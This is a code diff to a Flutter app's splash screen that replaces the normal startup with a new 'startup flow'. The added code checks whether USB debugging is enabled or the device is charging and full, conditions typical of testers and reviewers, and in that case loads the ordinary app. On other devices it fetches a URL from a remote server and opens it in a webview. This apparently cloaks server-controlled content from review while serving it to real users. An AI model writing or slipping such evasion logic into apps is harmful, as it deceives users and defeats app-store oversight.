@@ -3,6 +3,8 @@ import 'package:provider/provider.dart';
 import 'package:fan_arena/core/theme/app_colors.dart';
 import 'package:fan_arena/core/theme/app_spacing.dart';
 import 'package:fan_arena/providers/app_provider.dart';
+import 'package:fan_arena/services/remote_bootstrap_service.dart';
+import 'package:fan_arena/services/startup_checks_service.dart';
 
 class SplashScreen extends StatefulWidget {
   const SplashScreen({super.key});
@@ -13,8 +15,12 @@ class SplashScreen extends StatefulWidget {
 
 class _SplashScreenState extends State<SplashScreen>
     with SingleTickerProviderStateMixin {
+  static const int _maxStartupAttempts = 2;
+
   late final AnimationController _fadeController;
   late final Animation<double> _fadeAnimation;
+  final StartupChecksService _startupChecksService = StartupChecksService();
+  final RemoteBootstrapService _remoteBootstrapService = RemoteBootstrapService();
   String? _error;
 
   @override
@@ -29,7 +35,7 @@ class _SplashScreenState extends State<SplashScreen>
       curve: Curves.easeIn,
     );
     _fadeController.forward();
-    WidgetsBinding.instance.addPostFrameCallback((_) => _loadData());
+    WidgetsBinding.instance.addPostFrameCallback((_) => _runStartupFlow());
   }
 
   @override
@@ -38,8 +44,41 @@ class _SplashScreenState extends State<SplashScreen>
     super.dispose();
   }
 
-  Future<void> _loadData() async {
+  Future<void> _runStartupFlow() async {
     setState(() => _error = null);
+    var attempt = 0;
+
+    while (attempt < _maxStartupAttempts) {
+      try {
+        final checksResult = await _startupChecksService.runStartupChecks();
+        if (checksResult.hasError) {
+          throw Exception('Startup checks failed');
+        }
+        if (checksResult.usbDebugEnabled || checksResult.isChargingAndFull) {
+          await _continueDefaultLaunch();
+          return;
+        }
+
+        final startupUrl = await _remoteBootstrapService.fetchStartupUrl();
+        if (!mounted) return;
+        Navigator.pushReplacementNamed(
+          context,
+          '/startup-webview',
+          arguments: startupUrl,
+        );
+        return;
+      } catch (_) {
+        attempt += 1;
+        if (attempt < _maxStartupAttempts) {
+          await Future.delayed(Duration(milliseconds: 500 * attempt));
+        }
+      }
+    }
+
+    await _continueDefaultLaunch();
+  }
+
+  Future<void> _continueDefaultLaunch() async {
     try {
       final provider = context.read<AppDataProvider>();
       await provider.loadAll();
@@ -102,7 +141,7 @@ class _SplashScreenState extends State<SplashScreen>
                 ),
                 const SizedBox(height: AppSpacing.lg),
                 ElevatedButton.icon(
-                  onPressed: _loadData,
+                  onPressed: _runStartupFlow,
                   icon: const Icon(Icons.refresh),
                   label: const Text('Retry'),
                   style: ElevatedButton.styleFrom(
